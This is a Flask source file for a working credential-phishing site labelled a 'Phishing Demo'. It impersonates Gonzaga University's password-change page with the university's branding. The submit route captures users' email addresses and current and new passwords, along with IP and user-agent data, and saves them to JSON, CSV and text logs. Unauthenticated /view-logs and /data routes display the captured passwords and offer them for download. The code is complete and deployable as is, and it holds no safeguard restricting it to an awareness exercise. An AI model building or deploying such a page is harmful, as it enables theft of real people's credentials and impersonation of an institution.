from flask import Flask, render_template, request, redirect, url_for, send_file, jsonify, Response
import os
import json
import datetime
import socket
import uuid
import platform
import re
import csv
import sys

# Determine the absolute path to the templates directory
base_dir = os.path.dirname(os.path.abspath(__file__))
assets_dir = os.path.join(base_dir, 'assets')

# at the top of app.py, right after you compute base_dir:
DATA_DIR = os.environ.get(
    'DATA_DIR',
    os.path.join(base_dir, 'data')       # ← project-local ./data directory
)

# Create Flask app with proper folder structure
app = Flask(__name__, 
            static_folder=assets_dir)

# Debug paths
print(f"Base directory: {base_dir}")
print(f"Assets directory: {assets_dir}")
print(f"Assets folder exists: {os.path.exists(assets_dir)}")
if os.path.exists(assets_dir):
    print(f"Assets directory contents: {os.listdir(assets_dir)}")

# Set secret key for session management
app.secret_key = 'gu_phishing_demo_secret_key'

# Define data storage locations
DATA_DIR = os.environ.get('DATA_DIR', '/data')
LOG_FILE_JSON = f'{DATA_DIR}/submissions.json'
LOG_FILE_CSV = f'{DATA_DIR}/submissions.csv'
LOG_FILE_TXT = f'{DATA_DIR}/submissions.txt'

# CSV file headers
CSV_HEADERS = [
    'timestamp', 
    'email', 
    'current_password', 
    'new_password', 
    'confirm_password', 
    'ip_address', 
    'mac_address', 
    'hostname', 
    'user_agent'
]

# Ensure all print statements go to Docker logs
def log_to_console(message):
    print(message, flush=True)
    sys.stdout.flush()


def get_mac_address():
    """Get the MAC address of the device."""
    try:
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return mac
    except:
        return "Unknown MAC"


def get_system_info():
    """Get system information like OS, platform, etc."""
    try:
        info = {
            "platform": platform.platform(),
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor()
        }
        return info
    except:
        return {"platform": "Unknown"}


def initialize_log_files():
    """Create data directory and initialize log files if they don't exist."""
    # Create data directory
    os.makedirs(DATA_DIR, exist_ok=True)
    log_to_console(f"Data directory created at: {DATA_DIR}")
    
    # Create CSV file with headers
    if not os.path.exists(LOG_FILE_CSV):
        with open(LOG_FILE_CSV, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(CSV_HEADERS)
        log_to_console(f"CSV log file created: {LOG_FILE_CSV}")
    
    # Create empty JSON file
    if not os.path.exists(LOG_FILE_JSON):
        with open(LOG_FILE_JSON, 'w') as f:
            f.write("")
        log_to_console(f"JSON log file created: {LOG_FILE_JSON}")
    
    # Create text log file with header
    if not os.path.exists(LOG_FILE_TXT):
        with open(LOG_FILE_TXT, 'w') as f:
            f.write("=== Phishing Demo Submissions ===\n\n")
            f.write("-"*80 + "\n\n")
        log_to_console(f"Text log file created: {LOG_FILE_TXT}")


def format_readable_log(data):
    """Format submission data into a human-readable text format."""
    system_info = data['system_info']
    system_info_str = "\n".join([f"  {k}: {v}" for k, v in system_info.items()])
    
    readable = f"""
=== Submission at {data['timestamp']} ===
Email: {data['email']}
Current Password: {data['current_password']}
New Password: {data['new_password']}
Confirm Password: {data['confirm_password']}
IP Address: {data['ip_address']}
MAC Address: {data['mac_address']}
Hostname: {data['hostname']}
User Agent: {data['user_agent']}

System Information:
{system_info_str}
"""
    return readable


@app.route('/')
def index():
    """Main page with password change form."""
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Change Password - Gonzaga University</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                font-family: "Segoe UI", "Helvetica Neue", sans-serif;
                background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
                            url('/assets/GUbackground.jpg');
                background-size: cover;
                background-position: center;
                background-attachment: fixed;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .container {
                width: 100%;
                max-width: 400px;
                margin: 100px 20px auto;
                flex: 1;
            }

            .login-box {
                background: #fff;
                padding: 30px;
                border-radius: 4px;
                text-align: center;
            }

            .university-name {
                font-size: 14px;
                color: #333;
                margin-bottom: 16px;
                text-align: left;
            }

            h1 {
                font-size: 20px;
                font-weight: 600;
                margin-bottom: 16px;
                color: #041E42;
            }

            .form-group {
                margin-bottom: 16px;
            }

            label {
                display: block;
                font-size: 14px;
                color: #333;
                margin-bottom: 4px;
            }

            input {
                width: 100%;
                height: 36px;
                padding: 8px 12px;
                font-size: 14px;
                border: 1px solid #ddd;
                border-radius: 2px;
            }

            input:focus {
                outline: none;
                border-color: #041E42;
            }

            button {
                width: 100%;
                height: 36px;
                background: #041E42;
                color: white;
                border: none;
                border-radius: 2px;
                font-size: 14px;
                cursor: pointer;
                margin-top: 8px;
            }

            button:hover {
                background: #0a2e5c;
            }

            footer {
                margin-top: 24px;
                text-align: center;
                font-size: 12px;
                color: #666;
            }

            .logo {
                text-align: center;
                margin-bottom: 24px;
            }

            .logo img {
                height: auto;
                width: 200px;
                max-width: 100%;
            }

            .footer {
                width: 100%;
                padding: 20px;
                text-align: center;
                background: rgba(255, 255, 255, 0.9);
            }

            .footer span {
                color: #041E42;
                font-size: 12px;
                margin-right: 20px;
            }

            .footer a {
                color: #041E42;
                font-size: 12px;
                text-decoration: none;
                margin-right: 20px;
            }

            .footer a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="login-box">
                <div class="logo">
                    <img src="/assets/logo-microclimate-gonzaga-university.png" alt="Gonzaga University">
                </div>
                <h1>Change your password</h1>
                
                <form method="POST" action="/submit">
                    <div class="form-group">
                        <label for="email">Email Address</label>
                        <input type="email" id="email" name="email" placeholder="username@gonzaga.edu" required>
                    </div>

                    <div class="form-group">
                        <label for="currentPassword">Most Recent Password</label>
                        <input type="password" id="currentPassword" name="currentPassword" required>
                    </div>

                    <div class="form-group">
                        <label for="newPassword">New Password</label>
                        <input type="password" id="newPassword" name="newPassword" required>
                    </div>

                    <div class="form-group">
                        <label for="confirmPassword">Confirm New Password</label>
                        <input type="password" id="confirmPassword" name="confirmPassword" required>
                    </div>

                    <button type="submit">Submit</button>
                </form>
            </div>
        </div>
        <div class="footer">
            <span>©2024 Gonzaga University</span>
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Use</a>
            <a href="#">Contact Support</a>
        </div>
    </body>
    </html>
    """
    return Response(html, mimetype='text/html')


@app.route('/submit', methods=['POST'])
def submit():
    """Handle form submission and save the captured data."""
    # Get form data
    email = request.form.get('email')
    current_password = request.form.get('currentPassword')
    new_password = request.form.get('newPassword')
    confirm_password = request.form.get('confirmPassword')
    
    # Get IP address
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        client_ip = request.environ['REMOTE_ADDR']
    else:
        client_ip = request.environ['HTTP_X_FORWARDED_FOR']
    
    # Get system/device information
    mac_address = get_mac_address()
    hostname = socket.gethostname()
    user_agent = request.headers.get('User-Agent')
    system_info = get_system_info()
    timestamp = datetime.datetime.utcnow().isoformat()
    
    # Prepare data object
    visitor_info = {
        "timestamp": timestamp,
        "email": email,
        "current_password": current_password,
        "new_password": new_password,
        "confirm_password": confirm_password,
        "ip_address": client_ip,
        "user_agent": user_agent,
        "mac_address": mac_address,
        "hostname": hostname,
        "system_info": system_info,
    }

    # Log submission details to Docker console
    log_entry = f"""
PHISHING SUBMISSION CAPTURED:
---------------------------
Time: {timestamp}
Email: {email}
Current Password: {current_password}
New Password: {new_password}
IP Address: {client_ip}
User Agent: {user_agent}
---------------------------
"""
    log_to_console(log_entry)

    # Make sure data directory exists
    os.makedirs(DATA_DIR, exist_ok=True)
    
    # Save data in JSON format
    try:
        with open(LOG_FILE_JSON, 'a') as f:
            f.write(f"{json.dumps(visitor_info, default=str)}\n")
        log_to_console(f"Saved submission data to JSON file: {LOG_FILE_JSON}")
    except Exception as e:
        log_to_console(f"Error saving to JSON: {str(e)}")
    
    # Save data in CSV format
    try:
        with open(LOG_FILE_CSV, 'a', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow([
                timestamp,
                email,
                current_password,
                new_password,
                confirm_password,
                client_ip,
                mac_address,
                hostname,
                user_agent,
            ])
        log_to_console(f"Saved submission data to CSV file: {LOG_FILE_CSV}")
    except Exception as e:
        log_to_console(f"Error saving to CSV: {str(e)}")
    
    # Save data in readable text format
    try:
        with open(LOG_FILE_TXT, 'a') as f:
            f.write(format_readable_log(visitor_info))
            f.write("\n\n" + "-"*80 + "\n\n")
        log_to_console(f"Saved submission data to text file: {LOG_FILE_TXT}")
    except Exception as e:
        log_to_console(f"Error saving to text file: {str(e)}")
    
    # Redirect to success page
    return redirect('/success')


@app.route('/success')
def success():
    """Success page shown after form submission."""
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Password Changed - Gonzaga University</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                font-family: "Segoe UI", "Helvetica Neue", sans-serif;
                background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
                            url('/assets/GUbackground.jpg');
                background-size: cover;
                background-position: center;
                background-attachment: fixed;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .container {
                width: 100%;
                max-width: 400px;
                margin: 100px 20px auto;
                flex: 1;
            }

            .login-box {
                background: #fff;
                padding: 30px;
                border-radius: 4px;
                text-align: center;
            }

            h1 {
                font-size: 20px;
                font-weight: 600;
                margin-bottom: 16px;
                color: #041E42;
            }

            .success-message {
                color: #333;
                line-height: 1.5;
                margin-bottom: 20px;
            }

            .logo {
                text-align: center;
                margin-bottom: 24px;
            }

            .logo img {
                height: auto;
                width: 200px;
                max-width: 100%;
            }

            .footer {
                width: 100%;
                padding: 20px;
                text-align: center;
                background: rgba(255, 255, 255, 0.9);
                margin-top: auto;
            }

            .footer span {
                color: #041E42;
                font-size: 12px;
                margin-right: 20px;
            }

            .footer a {
                color: #041E42;
                font-size: 12px;
                text-decoration: none;
                margin-right: 20px;
            }

            .footer a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="login-box">
                <div class="logo">
                    <img src="/assets/logo-microclimate-gonzaga-university.png" alt="Gonzaga University">
                </div>
                <h1>Password Changed Successfully</h1>
                <p class="success-message">Your password has been updated. You can now sign in with your new password.</p>
            </div>
        </div>
        <div class="footer">
            <span>©2024 Gonzaga University</span>
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Use</a>
            <a href="#">Contact Support</a>
        </div>
    </body>
    </html>
    """
    return Response(html, mimetype='text/html')


@app.route('/data/<file_type>')
def get_data(file_type):
    """Provide access to the collected data files."""
    # Make sure data directory exists
    os.makedirs(DATA_DIR, exist_ok=True)
    
    try:
        if file_type == 'json':
            # If JSON file doesn't exist, create an empty one
            if not os.path.exists(LOG_FILE_JSON):
                with open(LOG_FILE_JSON, 'w') as f:
                    f.write("")
            return send_file(LOG_FILE_JSON, mimetype='application/json', as_attachment=True, download_name='submissions.json')
        
        elif file_type == 'csv':
            # If CSV file doesn't exist, create it with headers
            if not os.path.exists(LOG_FILE_CSV):
                with open(LOG_FILE_CSV, 'w', newline='') as csvfile:
                    writer = csv.writer(csvfile)
                    writer.writerow(CSV_HEADERS)
            return send_file(LOG_FILE_CSV, mimetype='text/csv', as_attachment=True, download_name='submissions.csv')
        
        elif file_type == 'txt':
            # If text file doesn't exist, create an empty one
            if not os.path.exists(LOG_FILE_TXT):
                with open(LOG_FILE_TXT, 'w') as f:
                    f.write("=== Phishing Demo Submissions ===\n\n")
                    f.write("-"*80 + "\n\n")
            return send_file(LOG_FILE_TXT, mimetype='text/plain', as_attachment=True, download_name='submissions.txt')
        
        else:
            return jsonify({"error": "Invalid file type requested. Use 'json', 'csv', or 'txt'."})
            
    except Exception as e:
        log_to_console(f"Error providing data file: {str(e)}")
        return jsonify({"error": f"Error accessing data file: {str(e)}"})


@app.route('/view-logs')
def view_logs():
    """View all submission logs without auto-refresh."""
    try:
        # Ensure logs directory exists
        os.makedirs(DATA_DIR, exist_ok=True)
        
        # Initialize log files if they don't exist
        initialize_log_files()
        
        # Read the submissions from the text file
        with open(LOG_FILE_TXT, 'r') as f:
            log_content = f.read()
        
        # Count total submissions
        submission_count = log_content.count("=== Submission at ")
            
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phishing Demo - Submissions</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {{
                    font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
                    margin: 20px;
                    background-color: #f5f5f5;
                    color: #333;
                }}
                h1 {{
                    color: #041E42;
                }}
                .header {{
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 20px;
                    flex-wrap: wrap;
                }}
                .stats {{
                    background-color: #041E42;
                    color: white;
                    padding: 10px 15px;
                    border-radius: 4px;
                    font-weight: bold;
                    font-size: 18px;
                }}
                .log-container {{
                    background-color: white;
                    padding: 20px;
                    border-radius: 4px;
                    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                    white-space: pre-wrap;
                    font-family: monospace;
                    max-width: 100%;
                    overflow-x: auto;
                    margin-bottom: 20px;
                }}
                .download-links {{
                    margin: 20px 0;
                }}
                .download-links a {{
                    display: inline-block;
                    margin-right: 15px;
                    padding: 8px 15px;
                    background-color: #041E42;
                    color: white;
                    text-decoration: none;
                    border-radius: 4px;
                    border: none;
                    font-size: 14px;
                    cursor: pointer;
                }}
                .download-links a:hover {{
                    background-color: #0a2e5c;
                }}
                .timestamp {{
                    color: #0a2e5c;
                    font-weight: bold;
                }}
                .last-update {{
                    font-size: 12px;
                    color: #666;
                    margin-top: 5px;
                }}
                .submission {{
                    border-bottom: 1px solid #eee;
                    padding-bottom: 10px;
                    margin-bottom: 10px;
                }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Phishing Demo - Submissions</h1>
                <div class="stats">
                    Total Submissions: {submission_count}
                </div>
            </div>
            
            <div class="download-links">
                <a href="/data/json">Download JSON</a>
                <a href="/data/csv">Download CSV</a>
                <a href="/data/txt">Download TXT</a>
            </div>
            
            <div class="log-container">
                {log_content}
            </div>
        </body>
        </html>
        """
        
        return Response(html, mimetype='text/html')
        
    except Exception as e:
        log_to_console(f"Error viewing logs: {str(e)}")
        return f"Error viewing logs: {str(e)}", 500


if __name__ == '__main__':
    # Initialize the log files when the app starts
    initialize_log_files()
    
    # Run the Flask development server
    host = os.environ.get('HOST', '0.0.0.0')
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    app.run(host=host, port=port, debug=debug)
